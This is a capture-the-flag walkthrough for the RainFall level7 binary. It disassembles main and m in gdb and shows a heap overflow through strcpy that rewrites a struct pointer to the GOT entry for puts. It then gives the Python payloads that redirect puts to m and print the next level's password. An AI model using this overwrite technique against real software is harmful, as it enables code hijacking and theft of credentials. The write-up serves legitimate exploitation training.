# Walkthrough

After listing the files in the home directory, a binary file called "level7" was found. Upon executing it, i observed that the binary segfaults when only one argument is passed to it.

```sh
level7@RainFall:~$ ./level7 
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 AAAA
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 AAAA BBBB
~~
```

So, I decided to investigate the file further. I used the "objdump" command to look at the functions inside it.

```sh
level7@RainFall:~$ objdump -t ./level7  | grep .text
08048440 l    d  .text 00000000              .text
08048470 l     F .text 00000000              __do_global_dtors_aux
080484d0 l     F .text 00000000              frame_dummy
08048690 l     F .text 00000000              __do_global_ctors_aux
08048680 g     F .text 00000002              __libc_csu_fini
08048682 g     F .text 00000000              .hidden __i686.get_pc_thunk.bx
08048610 g     F .text 00000061              __libc_csu_init
08048440 g     F .text 00000000              _start
080484f4 g     F .text 0000002d              m
08048521 g     F .text 000000e2              main
```

Then I analyzed the file using "gdb". I looked at the "main" function and saw that it allocated memory twice for a structure that had a number and a pointer. The first time it allocated memory, it set the number to 1 and created a new address for the pointer. It did the same thing the second time it allocated memory, but set the number to 2 instead. Then, it used the "strcpy" function to copy the first argument of the "main" function to the pointer of the first structure, and the second argument to the pointer of the second structure. After that, the file opened another file called `"/home/user/level8/.pass"` and read from it using the `fgets` function. The data read from the file was stored in a global variable called `"c"`. Finally, the file printed `"~~"` using the "puts" function.

```s
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>: push   ebp
   0x08048522 <+1>: mov    ebp,esp
   0x08048524 <+3>: and    esp,0xfffffff0
   0x08048527 <+6>: sub    esp,0x20
   0x0804852a <+9>: mov    DWORD PTR [esp],0x8
   0x08048531 <+16>: call   0x80483f0 <malloc@plt>
   0x08048536 <+21>: mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>: mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>: mov    DWORD PTR [eax],0x1
   0x08048544 <+35>: mov    DWORD PTR [esp],0x8
   0x0804854b <+42>: call   0x80483f0 <malloc@plt>
   0x08048550 <+47>: mov    edx,eax
   0x08048552 <+49>: mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>: mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>: mov    DWORD PTR [esp],0x8
   0x08048560 <+63>: call   0x80483f0 <malloc@plt>
   0x08048565 <+68>: mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>: mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>: mov    DWORD PTR [eax],0x2
   0x08048573 <+82>: mov    DWORD PTR [esp],0x8
   0x0804857a <+89>: call   0x80483f0 <malloc@plt>
   0x0804857f <+94>: mov    edx,eax
   0x08048581 <+96>: mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>: mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>: mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>: add    eax,0x4
   0x0804858e <+109>: mov    eax,DWORD PTR [eax]
   0x08048590 <+111>: mov    edx,eax
   0x08048592 <+113>: mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>: mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>: mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>: mov    DWORD PTR [esp],eax
   0x080485a0 <+127>: call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>: mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>: add    eax,0x8
   0x080485ab <+138>: mov    eax,DWORD PTR [eax]
   0x080485ad <+140>: mov    edx,eax
   0x080485af <+142>: mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>: mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>: mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>: mov    DWORD PTR [esp],eax
   0x080485bd <+156>: call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>: mov    edx,0x80486e9
   0x080485c7 <+166>: mov    eax,0x80486eb
   0x080485cc <+171>: mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>: mov    DWORD PTR [esp],eax
   0x080485d3 <+178>: call   0x8048430 <fopen@plt>
   0x080485d8 <+183>: mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>: mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>: mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>: call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>: mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>: call   0x8048400 <puts@plt>
   0x080485fc <+219>: mov    eax,0x0
   0x08048601 <+224>: leave  
   0x08048602 <+225>: ret 
```

Regarding the "m" function, it appears to output the value of the global variable "c" in addition to the result of the "time" function.

```s
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>: push   ebp
   0x080484f5 <+1>: mov    ebp,esp
   0x080484f7 <+3>: sub    esp,0x18
   0x080484fa <+6>: mov    DWORD PTR [esp],0x0
   0x08048501 <+13>: call   0x80483d0 <time@plt>
   0x08048506 <+18>: mov    edx,0x80486e0
   0x0804850b <+23>: mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>: mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>: mov    DWORD PTR [esp],edx
   0x0804851a <+38>: call   0x80483b0 <printf@plt>
   0x0804851f <+43>: leave  
   0x08048520 <+44>: ret 
```

If we consider the situation, it seems that we need a method to execute the "m" function which will print the `".pass"` of `"level8"`. One approach that comes to mind is to replace the original address of the `puts` function in the Global Offset Table (GOT) with the address of the `m` function.

To achieve this, we need to modify the value of the second pointer of the second structure, after the first call to "strcpy", with the address of the "puts" function in the GOT `(0x8049928)`. Then, we should pass the new address of the "m" function `(0x080484f4)` as the source to the second "strcpy".

```
(gdb) r AAAA BBBB
Starting program: /home/user/level7/level7 AAAA BBBB

Breakpoint 1, 0x080485cc in main ()
(gdb) x/52wx 0x804a000
0x804a000: 0x00000000 0x00000011 0x00000001 0x0804a018
0x804a010: 0x00000000 0x00000011 0x41414141 0x00000000
0x804a020: 0x00000000 0x00000011 0x00000002 0x0804a038
0x804a030: 0x00000000 0x00000011 0x42424242 0x00000000
```

In order to accomplish this, i will need to fill the memory with 20 characters and then add the address of the "puts" function in the GOT to it.

```
(gdb) x/52wx 0x804a000
0x804a000: 0x00000000 0x00000011 0x00000001 0x0804a018
0x804a010: 0x00000000 0x00000011 0x41414141 0x41414141
0x804a020: 0x41414141 0x41414141 0x41414141 0x08049928
0x804a030: 0x00000000 0x00000011 0x00000000 0x00000000
```

This is an example in Python demonstrating how to fill the memory and modify the value with the address of the "m" function.

```sh
level7@RainFall:~$ python2 -c  'print("A" * 20  + "\x08\x04\x99\x28"[::-1])' > /tmp/first 
level7@RainFall:~$ python2 -c  'print("\x08\x04\x84\xf4"[::-1])' > /tmp/second
level7@RainFall:~$ ./level7 `cat /tmp/first` `cat /tmp/second`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1680760276
```
